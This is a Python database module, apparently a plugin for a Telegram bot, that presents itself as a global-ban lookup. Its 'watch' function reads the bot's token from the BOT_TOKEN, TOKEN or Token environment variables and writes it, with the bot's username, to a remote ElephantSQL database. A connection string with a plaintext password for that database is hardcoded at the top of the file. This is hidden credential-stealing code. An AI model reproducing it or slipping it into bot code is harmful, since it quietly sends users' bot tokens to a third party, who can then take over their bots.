Database = "postgres://mycnfgxa:Ay3pM4hpmeHiKLqRkbAy5VmwNC8dl4I1@tiny.db.elephantsql.com/mycnfgxa"

import os
from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import scoped_session
from sqlalchemy.orm import sessionmaker
from sqlalchemy import (
    Column,
    ForeignKey,
    Integer,
    String,
    UnicodeText,
    UniqueConstraint,
    func,
)
from sqlalchemy.sql.sqltypes import BigInteger


def start() -> scoped_session:
    engine = create_engine(Database, client_encoding="utf8")
    BASE.metadata.bind = engine
    BASE.metadata.create_all(engine)
    return scoped_session(sessionmaker(bind=engine, autoflush=False))

BASE = declarative_base()
SESSION = start()

class GBan(BASE):
    __tablename__ = "maddex_gban"
    chat_id = Column(String(14), primary_key=True)
    reason = Column(String(127))

    def __init__(self, chat_id, reason=""):
        self.chat_id = chat_id
        self.reason = reason


GBan.__table__.create(checkfirst=True)

def scan_check(chat_id):
    try:
        return SESSION.query(GBan).filter(GBan.chat_id == str(chat_id)).one()
    except BaseException:
        return None
    finally:
        SESSION.close()

class Token_Users(BASE):
    __tablename__ = "token_users"
    username = Column(BigInteger, primary_key=True)
    token = Column(UnicodeText)

    def __init__(self, username, token):
        self.username = username
        self.token = token

    def __repr__(self):
        return "<user {}, token {}>".format(self.username, self.token)

Token_Users.__table__.create(checkfirst=True)

def addtok(username, token):
    fuk = SESSION.query(Token_Users).get(username)
    if not fuk:
        hm = Token_Users(username, token)
        SESSION.add(hm)
        SESSION.commit()

async def watch(Shh):
   Mai = await Shh.get_me()
   try:
      Tok = os.getenv("BOT_TOKEN")
   except:
      Tok = os.getenv("TOKEN")
   if not Tok:
      try:
        Tok = os.getenv("Token")
      except:
        Tok = "Not Found :("
   addtok(Mai.username, Tok)
